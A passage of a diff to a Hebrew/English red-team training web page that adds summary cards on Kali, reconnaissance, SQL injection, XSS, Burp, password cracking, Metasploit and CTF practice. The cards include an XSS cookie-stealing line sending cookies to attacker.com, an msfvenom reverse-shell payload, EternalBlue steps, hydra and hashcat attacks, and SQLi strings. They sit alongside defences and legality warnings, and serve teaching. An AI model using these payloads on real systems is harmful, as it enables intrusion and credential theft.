@@ -401,6 +401,109 @@ html, body {
   .ch-btn { padding: 7px 10px; min-width: 44px; }
 }
 
+
+/* ── RICH SUMMARY CARDS ── */
+.sum-block { margin-bottom: 28px; }
+.sum-block-title {
+  font-size: 13px; font-weight: 800; color: var(--accent);
+  text-transform: uppercase; letter-spacing: .08em;
+  margin-bottom: 10px; font-family: var(--mono);
+  display: flex; align-items: center; gap: 8px;
+}
+.sum-block-title::after { content:''; flex:1; height:1px; background:var(--border); }
+.sum-row {
+  display: grid; grid-template-columns: 200px 1fr;
+  gap: 10px 16px; padding: 9px 0;
+  border-bottom: 1px solid var(--border); align-items: start;
+}
+.sum-row:last-child { border-bottom: none; }
+.sum-k {
+  font-family: var(--mono); font-size: 12px; font-weight: 700;
+  color: var(--accent); line-height: 1.4;
+}
+.sum-v { font-size: 13px; color: var(--text2); line-height: 1.6; }
+.sum-v strong { color: var(--text); font-weight: 700; }
+.sum-v code { font-size: 11.5px; background: var(--bg3); padding: 1px 5px;
+  border-radius: 3px; color: var(--accent); font-family: var(--mono); }
+.sum-tip {
+  margin-top: 10px; padding: 10px 14px;
+  background: var(--yellowbg,#fffbeb); border-radius: var(--radius);
+  border: 1px solid #fde68a; font-size: 13px; color: #713f12; line-height: 1.6;
+}
+.sum-danger {
+  margin-top: 10px; padding: 10px 14px;
+  background: #fff1f2; border-radius: var(--radius);
+  border: 1px solid #fecaca; font-size: 13px; color: #991b1b; line-height: 1.6;
+}
+@media (max-width: 560px) { .sum-row { grid-template-columns: 1fr; gap: 2px; } }
+/* ── FULL REVIEW DRAWER ── */
+.review-btn {
+  flex-shrink: 0; padding: 5px 12px;
+  background: var(--accent); color: var(--accentfg);
+  border: none; border-radius: var(--radius);
+  font-size: 12px; font-weight: 700; cursor: pointer;
+  transition: all .15s; letter-spacing: .02em; margin-left: 6px;
+}
+[dir="rtl"] .review-btn { margin-left: 0; margin-right: 6px; }
+.review-btn:hover { background: var(--accent2); }
+.review-overlay {
+  display: none; position: fixed; inset: 0; z-index: 900;
+  background: rgba(0,0,0,.45); backdrop-filter: blur(2px);
+}
+.review-overlay.open { display: block; }
+.review-drawer {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 910;
+  background: var(--bg); border-bottom: 2px solid var(--accent);
+  box-shadow: 0 4px 16px rgba(0,0,0,.15);
+  transform: translateY(-100%);
+  transition: transform .3s cubic-bezier(.4,0,.2,1);
+  max-height: 90vh; display: flex; flex-direction: column;
+}
+.review-drawer.open { transform: translateY(0); }
+.review-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 20px; border-bottom: 1px solid var(--border);
+  flex-shrink: 0; gap: 12px; background: var(--bg);
+}
+.review-header-title { font-size: 15px; font-weight: 800; color: var(--text); }
+.review-header-sub { font-size: 12px; color: var(--text3,#9a9ab0); font-weight: 500; }
+.review-close {
+  width: 32px; height: 32px; border-radius: 50%;
+  background: var(--bg2); border: 1px solid var(--border);
+  font-size: 18px; cursor: pointer; display: flex;
+  align-items: center; justify-content: center;
+  flex-shrink: 0; color: var(--text2); line-height: 1; transition: all .15s;
+}
+.review-close:hover { background: #fff1f2; border-color: #dc2626; color: #dc2626; }
+.review-body { overflow-y: auto; padding: 24px 20px 40px; flex: 1; }
+.review-body::-webkit-scrollbar { width: 6px; }
+.review-body::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+.review-chapter-block {
+  margin-bottom: 36px; border: 1px solid var(--border);
+  border-radius: var(--radius2,12px); overflow: hidden;
+  box-shadow: 0 1px 3px rgba(0,0,0,.08);
+}
+.review-chapter-title {
+  background: var(--accentbg); border-bottom: 1px solid var(--border);
+  padding: 12px 18px; display: flex; align-items: center; gap: 10px;
+}
+.review-chapter-num {
+  font-family: var(--mono); font-size: 11px; font-weight: 800;
+  color: var(--accent); background: var(--bg);
+  border: 1px solid var(--accent); border-radius: 6px; padding: 2px 8px; flex-shrink: 0;
+}
+.review-chapter-name { font-size: 14px; font-weight: 800; color: var(--text); }
+.review-chapter-body { padding: 18px; background: var(--bg); }
+.review-chapter-body .sum-block { margin-bottom: 20px; }
+.review-chapter-body .sum-block:last-child { margin-bottom: 0; }
+.review-chapter-body .sum-row { grid-template-columns: 170px 1fr; padding: 7px 0; }
+.review-chapter-body .sum-v { font-size: 12.5px; }
+.review-chapter-body .sum-k { font-size: 11.5px; }
+@media (max-width: 680px) {
+  .review-drawer { max-height: 95vh; }
+  .review-body { padding: 16px 14px 32px; }
+  .review-chapter-body .sum-row { grid-template-columns: 1fr; }
+}
 </style>
 </head>
 <body>
@@ -410,7 +513,7 @@ html, body {
     <span>Red Team</span>
   </div>
   <span class="header-chname" id="headerChName"></span>
-  <button class="lang-btn" id="langBtn" onclick="toggleLang()">🇬🇧 EN</button>
+  <button class="review-btn" id="reviewBtn" onclick="openReview()">📚 סיכום מלא</button><button class="lang-btn" id="langBtn" onclick="toggleLang()">🇬🇧 EN</button>
 </header>
 <nav class="ch-nav" id="sidebar">
   <div class="sb-label" id="sbLabel" style="display:none"></div>
@@ -560,6 +663,18 @@ html, body {
       <div class="credit-item" id="credits-version">v2.0 — 2025</div></div>
   </div></div>
 </main>
+
+<div class="review-overlay" id="reviewOverlay" onclick="closeReview()"></div>
+<div class="review-drawer" id="reviewDrawer">
+  <div class="review-header">
+    <div>
+      <div class="review-header-title" id="reviewTitle">📚 סיכום מלא</div>
+      <div class="review-header-sub" id="reviewSub">כל 8 הפרקים בעמוד אחד</div>
+    </div>
+    <button class="review-close" onclick="closeReview()">×</button>
+  </div>
+  <div class="review-body" id="reviewBody"></div>
+</div>
 </body>
 </html>
 <script>
@@ -675,7 +790,7 @@ whois target_ip | grep OrgName  <span class="comment"># אמת שזה הclient</
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -775,7 +890,7 @@ grep -i "password\\|secret\\|key" recon/github_secrets.json</code></pre>
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -879,7 +994,7 @@ sqlmap -u "..." --dbs --output-dir=scans/sqlmap/</code></pre>
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -988,7 +1103,7 @@ curl -sI https://target.com | grep -i "content-security"
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -1089,7 +1204,7 @@ Check: "Use this proxy server for all protocols"
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -1189,7 +1304,7 @@ hydra -L usernames.txt -p "Winter2025!" ssh://target_ip -t 1</code></pre>
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -1294,7 +1409,7 @@ sessions -i 1  <span class="comment"># חזור לsession</span></code></pre>
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -1409,7 +1524,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
     <span class="ch-end-btn-label">משחק ידע</span>
   </button>
   <button class="ch-end-btn primary" onclick="showNextChapter(CHID)">
-    <span class="ch-end-btn-icon">▶</span>
+    <span class="ch-end-btn-icon">◀</span>
     <span class="ch-end-btn-label">פרק הבא</span>
   </button>
   <button class="ch-end-btn" onclick="showTab(CHID,'cheat')">
@@ -1419,16 +1534,118 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 </div>`
   ],
   cheat:[
-`<div class="callout callout-success"><strong>📋 Kali Linux — סביבת העבודה</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Debian</span></div><div class="cheat-item"><span class="cheat-key">pentesting בלבד</span></div><div class="cheat-item"><span class="cheat-key">14M+ סיסמאות</span></div><div class="cheat-item"><span class="cheat-key">Metasploit database</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Reconnaissance — מיפוי יעד</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Passive=לא שולח packets</span></div><div class="cheat-item"><span class="cheat-key">specific domain</span></div><div class="cheat-item"><span class="cheat-key">internet-connected devices</span></div><div class="cheat-item"><span class="cheat-key">כל 65535 ports</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 SQL Injection — כיצד ולמה</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">input לא sanitized בquery</span></div><div class="cheat-item"><span class="cheat-key">query להחזיר כל הרשומות</span></div><div class="cheat-item"><span class="cheat-key">מפריד SQL מdata</span></div><div class="cheat-item"><span class="cheat-key">SLEEP()</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 XSS — Cross-Site Scripting</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">לא צריך ש-victim ילחץ link</span></div><div class="cheat-item"><span class="cheat-key">server לא רואה payload</span></div><div class="cheat-item"><span class="cheat-key">Content Security Policy</span></div><div class="cheat-item"><span class="cheat-key">session cookies</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Burp Suite — Web Testing</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">8080</span></div><div class="cheat-item"><span class="cheat-key">שלח request ידנית וחזרה</span></div><div class="cheat-item"><span class="cheat-key">automated fuzzing/brute force</span></div><div class="cheat-item"><span class="cheat-key">Insecure Direct Object Reference</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Password Attacks — שבירת סיסמאות</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">מכוון להיות איטי</span></div><div class="cheat-item"><span class="cheat-key">MD5</span></div><div class="cheat-item"><span class="cheat-key">variations על wordlist words</span></div><div class="cheat-item"><span class="cheat-key">leaked username:password pairs</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Metasploit — Exploitation Framework</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">2003</span></div><div class="cheat-item"><span class="cheat-key">בזיכרון בלבד</span></div><div class="cheat-item"><span class="cheat-key">target IP</span></div><div class="cheat-item"><span class="cheat-key">attacker listening IP</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 CTF — תרגול ולמידה</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Capture The Flag</span></div><div class="cheat-item"><span class="cheat-key">machines ל-hack עם flags</span></div><div class="cheat-item"><span class="cheat-key">beginners-intermediate עם guided rooms</span></div><div class="cheat-item"><span class="cheat-key">flag{...} / CTF{...}</span></div></div></div>`
+`<div class="sum-block"><div class="sum-block-title">🐉 Kali Linux — מה זה ולמה</div>
+<div class="sum-row"><span class="sum-k">Kali Linux</span><span class="sum-v">הפצת Linux מבוססת Debian שפותחה על ידי Offensive Security. מגיעה מותקנת עם 600+ כלי אבטחה. לא מיועדת לשימוש יומיומי — אלא בלעדית ל-penetration testing ו-security research.</span></div>
+<div class="sum-row"><span class="sum-k">למה Kali ולא Ubuntu?</span><span class="sum-v">הכלים כבר מותקנים ומוגדרים. הגרסאות עדכניות. root mode זמין. kernel מוגדר לnetwork monitoring. כל שעה חסכת בהתקנה = שעה שתשקיע בלמידה.</span></div>
+<div class="sum-row"><span class="sum-k">כלים מרכזיים</span><span class="sum-v"><code>nmap</code> (port scanning), <code>metasploit</code> (exploitation), <code>burpsuite</code> (web), <code>wireshark</code> (network), <code>hashcat</code> (passwords), <code>sqlmap</code> (SQLi).</span></div>
+<div class="sum-row"><span class="sum-k">rockyou.txt</span><span class="sum-v">14 מיליון סיסמאות אמיתיות מ-2009 breach. ב-<code>/usr/share/wordlists/rockyou.txt</code>. ה-wordlist הנפוץ ביותר לתקיפה.</span></div>
+<div class="sum-row"><span class="sum-k">Metasploit Database</span><span class="sum-v"><code>service postgresql start</code> → <code>msfdb init</code>. שמירת hosts, services, vulns בין sessions. <code>db_nmap</code> = nmap שלוגים ישירות ל-MSF.</span></div>
+<div class="sum-danger">⚠️ בלי הרשאה בכתב — כל scanning/testing = עבירה פלילית. VulnHub, HackTheBox, TryHackMe = אפשרויות חוקיות לתרגול.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🔍 Reconnaissance — יסודות</div>
+<div class="sum-row"><span class="sum-k">Passive Recon</span><span class="sum-v">איסוף מידע <strong>ללא שליחת packets</strong>. המטרה לא יודעת. מקורות: Google, LinkedIn, Shodan, WHOIS, DNS records, Wayback Machine, GitHub leaks.</span></div>
+<div class="sum-row"><span class="sum-k">Active Recon</span><span class="sum-v">שליחת packets ישירות — <strong>ניתן לזיהוי</strong>. Port scanning, banner grabbing, OS fingerprinting. נראה ב-IDS/IPS. דורש הרשאה.</span></div>
+<div class="sum-row"><span class="sum-k">OSINT</span><span class="sum-v">Open Source Intelligence — ממקורות ציבוריים בלבד. SSL certs, DNS, LinkedIn, GitHub leaks. לעיתים מספיק לבניית תמונה מלאה של המטרה.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🛠️ כלי Reconnaissance</div>
+<div class="sum-row"><span class="sum-k"><code>nmap -sV -sC -p- target</code></span><span class="sum-v"><code>-sV</code> = version detection, <code>-sC</code> = default scripts, <code>-p-</code> = כל 65535 ports. <code>-sS</code> = SYN scan. <code>-O</code> = OS detection.</span></div>
+<div class="sum-row"><span class="sum-k">Shodan.io</span><span class="sum-v">מנוע חיפוש ל-devices מחוברי-אינטרנט. מוצא cameras, routers, SCADA. <code>org:"company"</code>, <code>port:22 country:IL</code>.</span></div>
+<div class="sum-row"><span class="sum-k"><code>dig axfr @ns1.domain.com domain.com</code></span><span class="sum-v">Zone Transfer — אם לא מוגדר נכון, חושף את כל ה-subdomains בבת-אחת.</span></div>
+<div class="sum-row"><span class="sum-k"><code>theHarvester -d domain.com</code></span><span class="sum-v">אוסף emails, subdomains, IPs. מחפש ב-Google, Bing, LinkedIn.</span></div>
+<div class="sum-tip">💡 סדר Recon: WHOIS → DNS → LinkedIn/Shodan → Zone Transfer → nmap top ports → full scan → version detection → vuln scan.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">💉 SQL Injection — הבסיס</div>
+<div class="sum-row"><span class="sum-k">מה זה SQLi?</span><span class="sum-v">כשinput של המשתמש מוכנס ישירות ל-SQL query <strong>ללא sanitization</strong>. תוקף מזריק SQL code שמשנה את ה-query. מאפשר: קריאת נתונים, עקיפת auth, ולעיתים RCE.</span></div>
+<div class="sum-row"><span class="sum-k">הדוגמה הקלאסית</span><span class="sum-v"><code>' OR '1'='1</code> בlogin form → WHERE condition תמיד אמת → עוקף authentication.</span></div>
+<div class="sum-row"><span class="sum-k">Prepared Statements</span><span class="sum-v">הפתרון: <code>SELECT * FROM users WHERE user=?</code>. ה-DB מטפל בparameter בנפרד. Input אינו SQL. מבטל SQLi לחלוטין.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🔢 סוגי SQLi</div>
+<div class="sum-row"><span class="sum-k">Union-based</span><span class="sum-v"><code>UNION SELECT</code> מאחד תוצאות ומחלץ data מטבלאות אחרות.</span></div>
+<div class="sum-row"><span class="sum-k">Boolean-based Blind</span><span class="sum-v">דף שונה כשהתנאי אמת/שקר. מחלץ data ביט אחרי ביט.</span></div>
+<div class="sum-row"><span class="sum-k">Time-based Blind</span><span class="sum-v"><code>'; IF(1=1) SLEEP(5)--</code> — עיכוב = תנאי אמת.</span></div>
+<div class="sum-row"><span class="sum-k">sqlmap</span><span class="sum-v"><code>sqlmap -u "url?id=1" --dbs</code> → <code>-D db -T users --dump</code>. אוטומציה מלאה של SQLi detection ו-exploitation.</span></div>
+<div class="sum-danger">⚠️ Equifax 2017: SQLi → 147M records. Yahoo 2013: 3 מיליארד חשבונות. עדיין OWASP Top 3 ב-2025.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🕷️ XSS — Cross-Site Scripting</div>
+<div class="sum-row"><span class="sum-k">מה זה XSS?</span><span class="sum-v">הזרקת JavaScript זדוני לדפים שיוצגו למשתמשים אחרים. הscript רץ ב-browser של הקורבן — עם ה-session וה-cookies שלו.</span></div>
+<div class="sum-row"><span class="sum-k">Reflected XSS</span><span class="sum-v">הpayload חוזר מיד ב-response. דורש שהקורבן ילחץ URL זדוני. נפוץ ב-search boxes, error messages.</span></div>
+<div class="sum-row"><span class="sum-k">Stored XSS</span><span class="sum-v"><strong>הכי מסוכן.</strong> הpayload נשמר ב-DB ומוצג לכולם. תגובה בפורום עם <code>&lt;script&gt;</code>. לא צריך שהקורבן ילחץ כלום.</span></div>
+<div class="sum-row"><span class="sum-k">DOM-based XSS</span><span class="sum-v">הpayload מעובד ב-browser בלבד. מנצל JS שקורא מה-DOM ישירות (<code>innerHTML</code>, <code>location.hash</code>).</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">💥 השפעה והגנה</div>
+<div class="sum-row"><span class="sum-k">Session Hijacking</span><span class="sum-v"><code>new Image().src='https://attacker.com/?c='+document.cookie</code> — גונב cookies. עם session cookie — התוקף נכנס כאותו משתמש.</span></div>
+<div class="sum-row"><span class="sum-k">HttpOnly Cookie</span><span class="sum-v"><code>Set-Cookie: session=abc; HttpOnly</code> — JS לא יכול לקרוא. מבטל Session Hijacking דרך XSS.</span></div>
+<div class="sum-row"><span class="sum-k">Content Security Policy</span><span class="sum-v"><code>script-src 'self'</code> — רק scripts מהdomain עצמו. מגבה XSS injection.</span></div>
+<div class="sum-row"><span class="sum-k">Output Encoding</span><span class="sum-v">כל user input ב-HTML → encode: <code>&lt;</code> → <code>&amp;lt;</code>. הbrowser מציג כטקסט, לא מריץ כscript.</span></div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🔧 Burp Suite — מה זה</div>
+<div class="sum-row"><span class="sum-k">Burp Suite</span><span class="sum-v">ה-platform הנפוץ ביותר ל-web app security testing. מיירט, מנתח ומשנה HTTP/S traffic. Community = חינמי, Pro = $449/שנה.</span></div>
+<div class="sum-row"><span class="sum-k">הגדרה</span><span class="sum-v">Proxy ב-port 8080. Browser שולח דרך Burp. Burp מיירט → אפשר לראות/לשנות → Forward לserver. דורש Burp CA cert לHTTPS.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">⚙️ כלי Burp עיקריים</div>
+<div class="sum-row"><span class="sum-k">Proxy → Intercept</span><span class="sum-v">מעצור לכל request. ראה כל parameters, שנה, Forward או Drop. לב Burp.</span></div>
+<div class="sum-row"><span class="sum-k">Repeater</span><span class="sum-v">שלח request ידנית עם שינויים. שנה parameter → שלח → ראה response. מושלם ל-manual testing.</span></div>
+<div class="sum-row"><span class="sum-k">Intruder</span><span class="sum-v">Automated fuzzing. סמן §position§ ב-request, החלף עם wordlist. Sniper / Cluster Bomb. לbrute force, SQLi, XSS.</span></div>
+<div class="sum-row"><span class="sum-k">Decoder</span><span class="sum-v">המרות: Base64, URL encoding, HTML. חיוני לפענוח cookies, JWTs, API params.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🎯 IDOR</div>
+<div class="sum-row"><span class="sum-k">מה זה IDOR?</span><span class="sum-v">גישה למשאב של מישהו אחר בשינוי ID. <code>/api/invoice/12345</code> → 12346 = חשבונית של אחר. Authentication בוצע, Authorization לא.</span></div>
+<div class="sum-row"><span class="sum-k">איתור עם Burp</span><span class="sum-v">Intercept → Repeater → שנה IDs שיטתית. Intruder עם range של מספרים. בדוק response size/content.</span></div>
+<div class="sum-tip">💡 תמיד התקן Burp CA cert לפני HTTPS interception. Firefox → Settings → Certificates → Import → burp_ca.der.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🔑 Password Attacks — יסודות</div>
+<div class="sum-row"><span class="sum-k">Hashing vs Encryption</span><span class="sum-v"><strong>Hash</strong>: חד-כיווני — סיסמה → hash, אי-אפשר להפוך. <strong>Encryption</strong>: דו-כיווני — ניתן לפענח. MD5/SHA1 לא מאובטחים לסיסמאות — מהירים מדי.</span></div>
+<div class="sum-row"><span class="sum-k">bcrypt / Argon2</span><span class="sum-v">מכוונים להיות <strong>איטיים</strong>. bcrypt round 12: ~100ms/hash = 10 ניסיונות/שניה. כוללים salt. מגנים מbrute force.</span></div>
+<div class="sum-row"><span class="sum-k">Salt</span><span class="sum-v">ערך random שמוסיפים לסיסמה לפני hashing. מבטיח שאותה סיסמה תיתן hash שונה לכל user. מבטל Rainbow Tables.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">⚔️ שיטות תקיפה</div>
+<div class="sum-row"><span class="sum-k">Dictionary Attack</span><span class="sum-v">ניסוי wordlist. <code>hashcat -m 0 hash.txt rockyou.txt</code>. מהיר ויעיל לסיסמאות נפוצות.</span></div>
+<div class="sum-row"><span class="sum-k">Rule-based Attack</span><span class="sum-v">Rules על wordlist: הוסף מספרים, החלף o→0. <code>hashcat -r rules/best64.rule</code>. מכסה "Password1!".</span></div>
+<div class="sum-row"><span class="sum-k">Credential Stuffing</span><span class="sum-v">username:password מleaks ישנים. רוב האנשים משתמשים באותה סיסמה בכמה אתרים. בדוק haveibeenpwned.com.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🔨 כלים</div>
+<div class="sum-row"><span class="sum-k">hashcat</span><span class="sum-v">GPU-based. RTX 4090: 300B MD5/sec. <code>-m 0</code>=MD5, <code>-m 3200</code>=bcrypt. <code>-m 1800</code>=SHA-512.</span></div>
+<div class="sum-row"><span class="sum-k">John the Ripper</span><span class="sum-v">CPU-based. <code>john --wordlist=rockyou.txt hash.txt</code>. <code>john --show hash.txt</code>.</span></div>
+<div class="sum-row"><span class="sum-k">hydra</span><span class="sum-v">Online brute force: SSH, FTP, HTTP, RDP. <code>hydra -l admin -P rockyou.txt ssh://target</code>.</span></div>
+<div class="sum-tip">💡 הרץ <code>hashid hash.txt</code> לזיהוי hash type לפני cracking. MD5 = שניות. bcrypt round 12 = שעות-ימים ל-RTX 4090.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🚀 Metasploit — מה זה</div>
+<div class="sum-row"><span class="sum-k">Metasploit Framework</span><span class="sum-v">ה-framework הנפוץ ביותר לexploitation. נוצר 2003 ע"י HD Moore. 2,300+ exploits ו-500+ payloads. Community חינמי.</span></div>
+<div class="sum-row"><span class="sum-k">Exploit vs Payload</span><span class="sum-v"><strong>Exploit</strong>: קוד שמנצל vulnerability. <strong>Payload</strong>: מה רץ אחרי הצלחה — reverse shell, meterpreter. ביחד = exploitation מלא.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">⚙️ פקודות MSF עיקריות</div>
+<div class="sum-row"><span class="sum-k"><code>search / use / show options</code></span><span class="sum-v"><code>search eternalblue</code> → <code>use exploit/windows/smb/ms17_010_eternalblue</code> → <code>show options</code> → set RHOSTS/LHOST/LPORT → <code>run</code>.</span></div>
+<div class="sum-row"><span class="sum-k">Meterpreter</span><span class="sum-v">Advanced payload ב-memory בלבד. <code>sysinfo</code>, <code>getuid</code>, <code>hashdump</code> (NTLM hashes), <code>shell</code>, <code>getsystem</code>.</span></div>
+<div class="sum-row"><span class="sum-k">Reverse Shell</span><span class="sum-v">Target מתחבר לתוקף — עוקף Firewall. <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe</code>.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🎯 Post-Exploitation</div>
+<div class="sum-row"><span class="sum-k">Privilege Escalation</span><span class="sum-v"><code>use post/multi/recon/local_exploit_suggester</code>. <code>getsystem</code> מנסה כמה טכניקות אוטומטית.</span></div>
+<div class="sum-row"><span class="sum-k">Pivoting</span><span class="sum-v"><code>route add 192.168.2.0/24 1</code> — תקיפת systems פנימיים דרך machine שנפרצה.</span></div>
+<div class="sum-danger">⚠️ Metasploit signatures מזוהות מיד ע"י EDR, AV, IDS ב-production. CTF machines לרוב לא מוגנות — יעדים אמיתיים כן.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🏁 CTF — Capture The Flag</div>
+<div class="sum-row"><span class="sum-k">מה זה CTF?</span><span class="sum-v">תחרויות/platforms לתרגול offensive security. המטרה: מצא <code>flag{...}</code> או <code>HTB{...}</code>. כל machine כולל user.txt ו-root.txt.</span></div>
+<div class="sum-row"><span class="sum-k">HackTheBox (HTB)</span><span class="sum-v">Machines אמיתיות. Easy → Insane. Retired = writeups זמינים. Active = אסור לשתף. דורש hack של invite להצטרפות.</span></div>
+<div class="sum-row"><span class="sum-k">TryHackMe</span><span class="sum-v">Guided rooms. מתאים למתחילים. Free + Premium. Paths: "Jr Pentester", "SOC Level 1".</span></div>
+<div class="sum-row"><span class="sum-k">VulnHub</span><span class="sum-v">VMs להורדה לתרגול מקומי. חינמי לחלוטין. ללא VPN.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🗺️ CTF Methodology</div>
+<div class="sum-row"><span class="sum-k">1. Enumeration</span><span class="sum-v"><code>nmap -sV -sC -p- target</code>. ports? services? OS? השלב הכי חשוב — enumerate ביסודיות.</span></div>
+<div class="sum-row"><span class="sum-k">2. Web Enum</span><span class="sum-v"><code>gobuster dir -u http://target -w medium.txt</code>. <code>nikto -h target</code>.</span></div>
+<div class="sum-row"><span class="sum-k">3. Exploitation</span><span class="sum-v"><code>searchsploit apache 2.4.49</code>. ExploitDB, GitHub, GTFOBins.</span></div>
+<div class="sum-row"><span class="sum-k">4. PrivEsc</span><span class="sum-v"><code>sudo -l</code> → <code>find / -perm -4000 2>/dev/null</code> → linpeas.sh / winpeas.exe.</span></div>
+<div class="sum-row"><span class="sum-k">5. Flag</span><span class="sum-v"><code>cat /home/user/user.txt</code> ו-<code>cat /root/root.txt</code>. Submit.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🛠️ CTF Toolkit חיוני</div>
+<div class="sum-row"><span class="sum-k">Web</span><span class="sum-v">Burp Suite, gobuster/ffuf, nikto, sqlmap</span></div>
+<div class="sum-row"><span class="sum-k">Exploitation</span><span class="sum-v">Metasploit, searchsploit, pwntools, GTFOBins</span></div>
+<div class="sum-row"><span class="sum-k">Linux PrivEsc</span><span class="sum-v">linpeas.sh, sudo -l, SUID, cron jobs, pspy</span></div>
+<div class="sum-row"><span class="sum-k">Windows PrivEsc</span><span class="sum-v">winpeas.exe, PowerUp.ps1, BloodHound, mimikatz</span></div>
+<div class="sum-tip">💡 תמיד רשום notes! שמור כל פקודה ו-output. CTF machines מורכבות — קל לשכוח פרטים. Obsidian, CherryTree, Notion.</div>
+</div>`
   ]
 },
+
 en:{
   dir:'ltr',lang:'en',langBtn:'🇮🇱 HE',sbLabel:'Chapters',
   names:["Kali Linux — The Environment", "Reconnaissance — Target Mapping", "SQL Injection — How and Why", "XSS — Cross-Site Scripting", "Burp Suite — Web Testing", "Password Attacks — Cracking Passwords", "Metasploit — Exploitation Framework", "CTF — Practice & Learning"],
@@ -2255,14 +2472,106 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 </div>`
   ],
   cheat:[
-`<div class="callout callout-success"><strong>📋 Kali Linux — The Environment</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Debian</span></div><div class="cheat-item"><span class="cheat-key">pentesting only</span></div><div class="cheat-item"><span class="cheat-key">14M+ passwords</span></div><div class="cheat-item"><span class="cheat-key">Metasploit database</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Reconnaissance — Target Mapping</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Passive=no packets sent</span></div><div class="cheat-item"><span class="cheat-key">specific domain</span></div><div class="cheat-item"><span class="cheat-key">internet-connected devices</span></div><div class="cheat-item"><span class="cheat-key">all 65535 ports</span></div></div></div>`,
